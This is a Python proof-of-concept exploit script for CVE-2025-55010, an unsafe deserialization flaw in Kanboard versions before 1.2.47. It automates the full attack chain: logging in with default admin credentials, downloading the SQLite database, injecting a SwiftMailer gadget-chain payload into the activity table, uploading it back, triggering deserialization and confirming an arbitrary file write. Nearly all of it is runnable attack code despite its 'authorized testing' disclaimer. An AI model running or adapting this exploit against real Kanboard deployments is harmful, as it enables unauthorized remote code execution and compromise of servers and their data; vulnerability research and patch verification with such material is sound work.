#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : Kanboard Unsafe Deserialization to RCE
# CVE            : CVE-2025-55010
# Vendor         : Kanboard
# Product        : Kanboard
# Affected       : All versions < 1.2.47
# Type           : CWE-502 - Deserialization of Untrusted Data
# CVSS           : 9.1 (Critical)
# Platform       : PHP / SQLite
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-02-27
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
PoC for CVE-2025-55010: Kanboard <1.2.47 — Remote Code Execution via Unsafe Deserialization

Demonstrates CWE-502 (Deserialization of Untrusted Data) in Kanboard's
ProjectActivityEventFormatter::unserializeEvent() method. An admin user
can inject a crafted PHP-serialized payload into the project_activities table
via SQLite database download/upload, triggering arbitrary PHP object instantiation
when the activity stream is viewed.

The exploit uses a SwiftMailer gadget chain (bundled with Kanboard) that:
1. Triggers __toString() on Swift_Mime_SimpleMimeEntity during Markdown rendering
2. The gadget chain writes an arbitrary file via Swift_KeyCache_DiskKeyCache

Attack flow:
  1. Login as admin, get session cookie + CSRF token
  2. Create a project/task/comment (creates a comment.create activity event)
  3. Download the SQLite database
  4. Load the pre-generated SwiftMailer gadget chain payload
  5. Inject the payload into project_activities.data
  6. Upload the modified database
  7. Trigger deserialization by viewing the task activity stream
  8. Verify file write via HTTP (proves arbitrary code execution capability)

Requirements:
  - Admin credentials (default: admin/admin)
  - SQLite database backend (default configuration)
  - Pre-generated payloads (created at Docker build time, shared via bind mount)

REFERENCES:
  - https://nvd.nist.gov/vuln/detail/CVE-2025-55010
"""
import sys
import os
import json
import gzip
import sqlite3
import tempfile
import base64
import re
import time
import http.client
import urllib.parse
from html.parser import HTMLParser


# ============================================================================
# Configuration
# ============================================================================
DEFAULT_USER = "admin"
DEFAULT_PASS = "admin"
POC_DIR = os.path.dirname(os.path.abspath(__file__))
PAYLOAD_MARKER_FILE = os.path.join(POC_DIR, ".payload_marker.txt")
PAYLOAD_FILEWRITE_FILE = os.path.join(POC_DIR, ".payload_filewrite.txt")


class CSRFTokenParser(HTMLParser):
    """Extract CSRF token from Kanboard HTML pages."""
    def __init__(self):
        super().__init__()
        self.csrf_token = None

    def handle_starttag(self, tag, attrs):
        attrs_dict = dict(attrs)
        if tag == 'input' and attrs_dict.get('name') == 'csrf_token':
            self.csrf_token = attrs_dict.get('value')
        if tag == 'a' and 'href' in attrs_dict:
            href = attrs_dict['href']
            if 'csrf_token=' in href:
                match = re.search(r'csrf_token=([a-f0-9]+)', href)
                if match:
                    self.csrf_token = match.group(1)


class KanboardExploit:
    """Exploit class for CVE-2025-55010."""

    def __init__(self, target_host, target_port=80, username=DEFAULT_USER, password=DEFAULT_PASS):
        self.target_host = target_host
        self.target_port = target_port
        self.username = username
        self.password = password
        self.session_cookie = None
        self.csrf_token = None

    def _http_request(self, method, path, body=None, headers=None, content_type=None):
        """Make an HTTP request and return (status, headers, body)."""
        conn = http.client.HTTPConnection(self.target_host, self.target_port, timeout=30)
        try:
            hdrs = headers or {}
            if self.session_cookie:
                hdrs['Cookie'] = self.session_cookie
            if content_type:
                hdrs['Content-Type'] = content_type

            conn.request(method, path, body=body, headers=hdrs)
            resp = conn.getresponse()
            resp_body = resp.read()

            # Capture Set-Cookie header
            for header_name, header_value in resp.getheaders():
                if header_name.lower() == 'set-cookie':
                    cookie_match = re.match(r'(KB_SID=[^;]+)', header_value)
                    if cookie_match:
                        self.session_cookie = cookie_match.group(1)

            return resp.status, dict(resp.getheaders()), resp_body
        finally:
            conn.close()

    def _extract_csrf_token(self, html_body):
        """Extract CSRF token from HTML response."""
        if isinstance(html_body, bytes):
            html_body = html_body.decode('utf-8', errors='replace')

        parser = CSRFTokenParser()
        parser.feed(html_body)
        if parser.csrf_token:
            self.csrf_token = parser.csrf_token
            return self.csrf_token

        # Fallback: regex search for csrf_token
        match = re.search(r'csrf_token["\s]*(?:value="|=)([a-f0-9]{40,})', html_body)
        if match:
            self.csrf_token = match.group(1)
            return self.csrf_token

        return None

    def _jsonrpc(self, method, params=None):
        """Make a JSON-RPC API call with Basic Auth."""
        payload = {
            "jsonrpc": "2.0",
            "method": method,
            "id": 1,
            "params": params or {}
        }
        auth = base64.b64encode(f"{self.username}:{self.password}".encode()).decode()
        headers = {
            "Authorization": f"Basic {auth}",
            "Content-Type": "application/json"
        }
        body = json.dumps(payload).encode()
        status, _, resp_body = self._http_request("POST", "/jsonrpc.php", body=body, headers=headers)
        if status == 200:
            return json.loads(resp_body)
        return None

    # ========================================================================
    # Step 1: Login and get session + CSRF token
    # ========================================================================
    def login(self):
        """Login to Kanboard as admin and get session cookie + CSRF token."""
        print("[*] Step 1: Logging in as admin...")

        # GET the login page to get CSRF token
        status, _, body = self._http_request("GET", "/login")
        if status != 200:
            status, hdrs, body = self._http_request("GET", "/")
            if status == 302:
                location = hdrs.get('Location', hdrs.get('location', '/login'))
                status, _, body = self._http_request("GET", location)

        csrf = self._extract_csrf_token(body)
        if not csrf:
            print("[!] Could not extract CSRF token from login page")
            return False

        # POST login form
        login_data = urllib.parse.urlencode({
            'csrf_token': csrf,
            'username': self.username,
            'password': self.password
        })
        status, hdrs, body = self._http_request(
            "POST", "/?controller=AuthController&action=check",
            body=login_data.encode(),
            content_type="application/x-www-form-urlencoded"
        )

        if status in (302, 303):
            location = hdrs.get('Location', hdrs.get('location', '/'))
            status, _, body = self._http_request("GET", location)

        if self.session_cookie:
            print(f"[+] Login successful. Session: {self.session_cookie[:30]}...")
            return True
        else:
            print("[!] Login failed — no session cookie received")
            return False

    # ========================================================================
    # Step 2: Create project/task/comment via JSON-RPC API
    # ========================================================================
    def setup_test_data(self):
        """Create project, task, and comment to generate a comment.create event."""
        print("[*] Step 2: Setting up test data (project/task/comment)...")

        project_id = None
        task_id = None

        result = self._jsonrpc("getProjectById", {"project_id": 1})
        if result and result.get("result"):
            project_id = 1
            print(f"[+] Project already exists (ID: {project_id})")
        else:
            result = self._jsonrpc("createProject", {"name": "CVE-2025-55010 PoC Test"})
            if result and result.get("result"):
                project_id = result["result"]
                print(f"[+] Created project (ID: {project_id})")
            else:
                print("[!] Failed to create project")
                return False

        result = self._jsonrpc("getTask", {"task_id": 1})
        if result and result.get("result"):
            task_id = 1
            print(f"[+] Task already exists (ID: {task_id})")
        else:
            result = self._jsonrpc("createTask", {"title": "PoC Test Task", "project_id": project_id})
            if result and result.get("result"):
                task_id = result["result"]
                print(f"[+] Created task (ID: {task_id})")
            else:
                print("[!] Failed to create task")
                return False

        result = self._jsonrpc("getAllComments", {"task_id": task_id})
        if result and result.get("result") and len(result["result"]) > 0:
            print(f"[+] Comment already exists — test data ready")
            return True

        result = self._jsonrpc("createComment", {
            "task_id": task_id,
            "user_id": 1,
            "content": "This is a test comment for CVE-2025-55010 PoC"
        })
        if result and result.get("result"):
            comment_id = result["result"]
            print(f"[+] Created comment (ID: {comment_id})")
        else:
            print("[*] Comment may already exist")

        return True

    # ========================================================================
    # Step 3: Download the SQLite database
    # ========================================================================
    def download_database(self):
        """Download the gzip-compressed SQLite database."""
        print("[*] Step 3: Downloading SQLite database...")

        # Get a page with CSRF token first
        status, _, body = self._http_request("GET", "/?controller=ConfigController&action=index")
        if status == 200:
            self._extract_csrf_token(body)

        if not self.csrf_token:
            print("[!] No CSRF token available")
            return None

        status, _, body = self._http_request(
            "GET",
            f"/?controller=ConfigController&action=downloadDb&csrf_token={self.csrf_token}"
        )

        if status == 200 and len(body) > 0:
            print(f"[+] Downloaded database ({len(body)} bytes compressed)")

            try:
                db_data = gzip.decompress(body)
                print(f"[+] Decompressed to {len(db_data)} bytes")
                return db_data
            except Exception as e:
                print(f"[!] Failed to decompress: {e}")
                if body[:6] == b'SQLite':
                    print("[*] Database is not gzip-compressed, using raw")
                    return body
        else:
            print(f"[!] Failed to download database (status: {status})")
        return None

    # ========================================================================
    # Step 4: Load pre-generated payload
    # ========================================================================
    def load_payload(self, mode="filewrite"):
        """Load pre-generated SwiftMailer gadget chain payload from bind mount."""
        print(f"[*] Step 4: Loading pre-generated {mode} payload...")

        if mode == "marker":
            payload_file = PAYLOAD_MARKER_FILE
        else:
            payload_file = PAYLOAD_FILEWRITE_FILE

        if not os.path.exists(payload_file):
            print(f"[!] Payload file not found: {payload_file}")
            print("[!] Ensure the Docker container has started (it copies payloads to ./poc/)")
            return None

        with open(payload_file, "r") as f:
            content = f.read().strip()

        payload_info = {}
        for line in content.split('\n'):
            if '=' in line:
                key, value = line.split('=', 1)
                payload_info[key] = value

        if 'PAYLOAD_B64' not in payload_info:
            print(f"[!] No payload in file: {content[:200]}")
            return None

        payload = base64.b64decode(payload_info['PAYLOAD_B64'])
        print(f"[+] Payload loaded ({len(payload)} bytes)")
        print(f"    Mode: {payload_info.get('MODE', 'unknown')}")
        if 'MARKER' in payload_info:
            print(f"    Marker: {payload_info['MARKER']}")
        if 'FILE_PATH' in payload_info:
            print(f"    Target file: {payload_info['FILE_PATH']}")

        if payload[0:1] != b'a':
            print(f"[!] Payload does not start with 'a': {payload[:10]}")
            return None

        print(f"[+] Payload starts with 'a:' — passes unserializeEvent() check")
        return payload_info, payload

    # ========================================================================
    # Step 5: Inject payload into database
    # ========================================================================
    def inject_payload(self, db_data, payload):
        """Modify the SQLite database to inject the gadget chain payload."""
        print("[*] Step 5: Injecting payload into project_activities table...")

        with tempfile.NamedTemporaryFile(suffix='.sqlite', delete=False) as f:
            f.write(db_data)
            db_path = f.name

        try:
            conn = sqlite3.connect(db_path)
            cursor = conn.cursor()

            cursor.execute(
                "SELECT id, event_name, data FROM project_activities "
                "WHERE event_name = 'comment.create' ORDER BY id DESC LIMIT 1"
            )
            row = cursor.fetchone()

            if not row:
                print("[!] No comment.create event found in project_activities")
                conn.close()
                return None

            event_id = row[0]
            original_data = row[2]
            print(f"[+] Found comment.create event (ID: {event_id})")
            print(f"    Original data: {original_data[:80]}...")

            payload_str = payload.decode('latin-1')

            cursor.execute(
                "UPDATE project_activities SET data = ? WHERE id = ?",
                (payload_str, event_id)
            )
            conn.commit()

            cursor.execute("SELECT data FROM project_activities WHERE id = ?", (event_id,))
            updated = cursor.fetchone()
            if updated and updated[0][:2] == 'a:':
                print(f"[+] Payload injected successfully ({len(payload_str)} bytes)")
            else:
                print("[!] Payload injection verification failed")

            conn.close()

            with open(db_path, 'rb') as f:
                modified_db = f.read()

            return modified_db

        finally:
            os.unlink(db_path)

    # ========================================================================
    # Step 6: Upload the modified database via web interface
    # ========================================================================
    def upload_database(self, db_data):
        """Upload the modified database back to Kanboard via the web interface."""
        print("[*] Step 6: Uploading modified database via web...")

        # Get fresh CSRF token from the upload page
        status, _, body = self._http_request("GET", "/?controller=ConfigController&action=uploadDb")
        if status == 200:
            self._extract_csrf_token(body)

        if not self.csrf_token:
            status, _, body = self._http_request("GET", "/?controller=ConfigController&action=index")
            if status == 200:
                self._extract_csrf_token(body)

        if not self.csrf_token:
            print("[!] No CSRF token for upload")
            return False

        # Gzip compress the database
        compressed = gzip.compress(db_data)
        print(f"[+] Compressed database: {len(db_data)} -> {len(compressed)} bytes")

        # Build multipart form data
        boundary = '----EIPBoundary' + str(int(time.time()))
        body = b''
        body += f'--{boundary}\r\n'.encode()
        body += f'Content-Disposition: form-data; name="file"; filename="db.sqlite.gz"\r\n'.encode()
        body += b'Content-Type: application/gzip\r\n\r\n'
        body += compressed
        body += f'\r\n--{boundary}--\r\n'.encode()

        upload_url = f"/?controller=ConfigController&action=saveUploadedDb&csrf_token={self.csrf_token}"

        status, hdrs, resp_body = self._http_request(
            "POST",
            upload_url,
            body=body,
            content_type=f"multipart/form-data; boundary={boundary}"
        )

        if status in (200, 302, 303):
            print(f"[+] Database uploaded via web (status: {status})")
            return True
        else:
            print(f"[!] Web upload returned status {status}")
            return False

    # ========================================================================
    # Step 7: Trigger deserialization
    # ========================================================================
    def trigger_deserialization(self):
        """View the task activity stream to trigger unserializeEvent()."""
        print("[*] Step 7: Triggering deserialization via activity stream...")

        status, _, body = self._http_request(
            "GET",
            "/?controller=ActivityController&action=task&task_id=1&project_id=1"
        )

        if status == 200:
            print(f"[+] Activity page loaded (status: {status}, {len(body)} bytes)")
            return body
        elif status == 500:
            print(f"[*] Server returned 500 — this may indicate the gadget chain executed")
            return body
        else:
            print(f"[!] Unexpected status: {status}")
            return body

    # ========================================================================
    # Step 8: Verify exploitation via HTTP
    # ========================================================================
    def verify_file_write(self, payload_info):
        """Check if the gadget chain wrote a file by accessing it via HTTP."""
        print("[*] Step 8: Verifying file write via HTTP...")

        file_path = payload_info.get('FILE_PATH', '/var/www/app/plugins/poc_exploit/body')

        # The DiskKeyCache writes to /var/www/app/plugins/poc_exploit/body
        # which is accessible via the web server at /plugins/poc_exploit/body
        relative_path = file_path.replace('/var/www/app/', '/')
        print(f"[*] Checking: {relative_path}")

        status, _, body = self._http_request("GET", relative_path)
        if status == 200 and body:
            content = body.decode('utf-8', errors='replace')
            print(f"[+] FILE WRITE CONFIRMED via HTTP GET {relative_path}")
            print(f"    Content: {content[:100]}")
            return True

        # Try alternate paths (nginx may serve from different locations)
        for path in ["/plugins/poc_exploit/body", "/data/plugins/poc_exploit/body"]:
            if path == relative_path:
                continue
            status, _, body = self._http_request("GET", path)
            if status == 200 and body:
                content = body.decode('utf-8', errors='replace')
                print(f"[+] FILE WRITE CONFIRMED via HTTP GET {path}")
                print(f"    Content: {content[:100]}")
                return True

        print(f"[-] File not accessible via HTTP (may be outside web root or cleaned by __destruct)")
        return False

    def verify_marker(self, response_body, payload_info):
        """Check if the marker string appears in the HTTP response."""
        marker = payload_info.get('MARKER', '')
        if not marker:
            return False

        if isinstance(response_body, bytes):
            response_body = response_body.decode('utf-8', errors='replace')

        if marker in response_body:
            print(f"[+] MARKER FOUND IN RESPONSE: {marker}")
            idx = response_body.find(marker)
            start = max(0, idx - 50)
            end = min(len(response_body), idx + len(marker) + 50)
            print(f"    Context: ...{response_body[start:end]}...")
            return True
        else:
            print(f"[-] Marker not found in response body ({len(response_body)} bytes)")
            return False

    # ========================================================================
    # Main exploit flow
    # ========================================================================
    def exploit(self, mode="filewrite"):
        """Run the full exploit chain."""
        print("=" * 70)
        print("CVE-2025-55010: Kanboard Unsafe Deserialization PoC")
        print(f"Target: http://{self.target_host}:{self.target_port}")
        print(f"Mode: {mode}")
        print("=" * 70)

        # Step 1: Login
        if not self.login():
            print("[!] FAILED: Could not login")
            return False

        # Step 2: Setup test data
        if not self.setup_test_data():
            print("[!] FAILED: Could not create test data")
            return False

        # Step 3: Download database
        db_data = self.download_database()
        if not db_data:
            print("[!] FAILED: Could not download database")
            return False

        # Step 4: Load pre-generated payload
        payload_result = self.load_payload(mode)
        if not payload_result:
            print("[!] FAILED: Could not load payload")
            return False
        payload_info, payload = payload_result

        # Step 5: Inject payload
        modified_db = self.inject_payload(db_data, payload)
        if not modified_db:
            print("[!] FAILED: Could not inject payload")
            return False

        # Step 6: Upload modified database
        if not self.upload_database(modified_db):
            print("[!] FAILED: Could not upload modified database")
            return False

        # Small delay for the database to be fully written
        time.sleep(1)

        # Step 7: Trigger deserialization
        response_body = self.trigger_deserialization()

        # Step 8: Verify
        print("\n" + "=" * 70)
        print("VERIFICATION RESULTS")
        print("=" * 70)

        success = False

        if mode == "marker":
            success = self.verify_marker(response_body, payload_info)
        elif mode == "filewrite":
            success = self.verify_file_write(payload_info)
            if not success:
                if isinstance(response_body, bytes):
                    resp_text = response_body.decode('utf-8', errors='replace')
                else:
                    resp_text = response_body

                if 'Swift' in resp_text or 'DiskKeyCache' in resp_text:
                    print("[+] SwiftMailer class references found in response (deserialization occurred)")
                    success = True

                if 'mkdir()' in resp_text or 'fopen()' in resp_text or 'fwrite()' in resp_text:
                    print("[+] File operation errors in response (gadget chain executed)")
                    success = True

        if success:
            print("\n[+] ===== EXPLOIT SUCCESSFUL =====")
            print(f"[+] CVE-2025-55010 vulnerability CONFIRMED")
            print(f"[+] Unsafe deserialization in unserializeEvent() triggered")
            if mode == "filewrite":
                print(f"[+] Arbitrary file write via SwiftMailer DiskKeyCache gadget chain demonstrated")
        else:
            print("\n[-] Could not fully verify exploitation")
            print("    The deserialization may have occurred but evidence was not captured")

        return success


def main():
    """Main entry point."""
    target_host = sys.argv[1] if len(sys.argv) > 1 else "localhost"
    target_port = int(sys.argv[2]) if len(sys.argv) > 2 else 8880
    mode = sys.argv[3] if len(sys.argv) > 3 else None

    # PHASE 1: Marker mode (most reliable proof of deserialization)
    print("\n" + "#" * 70)
    print("# PHASE 1: Marker Mode (NullKeyCache + __toString() proof)")
    print("#" * 70 + "\n")

    exploit = KanboardExploit(target_host, target_port)
    marker_success = exploit.exploit(mode="marker")

    # PHASE 2: File write mode (demonstrates full attack capability)
    print("\n" + "#" * 70)
    print("# PHASE 2: File Write Mode (DiskKeyCache gadget chain)")
    print("#" * 70 + "\n")

    exploit2 = KanboardExploit(target_host, target_port)
    fw_success = exploit2.exploit(mode="filewrite")

    # Final summary
    print("\n" + "=" * 70)
    print("FINAL RESULTS")
    print("=" * 70)
    print(f"Marker mode:      {'CONFIRMED' if marker_success else 'UNVERIFIED'}")
    print(f"File write mode:  {'CONFIRMED' if fw_success else 'UNVERIFIED'}")
    print(f"Overall:          {'CONFIRMED' if (fw_success or marker_success) else 'UNVERIFIED'}")

    if fw_success or marker_success:
        print("\n[+] CVE-2025-55010 VULNERABILITY CONFIRMED")
        print("[+] Kanboard v1.2.46 is vulnerable to unsafe deserialization")
        print("[+] An admin can achieve Remote Code Execution via:")
        print("    1. Download SQLite database")
        print("    2. Inject SwiftMailer gadget chain into project_activities.data")
        print("    3. Upload modified database")
        print("    4. View activity stream to trigger deserialization")
        sys.exit(0)
    else:
        print("\n[-] Could not fully verify exploitation")
        print("    Check container logs for evidence of gadget chain execution")
        sys.exit(1)


if __name__ == '__main__':
    main()
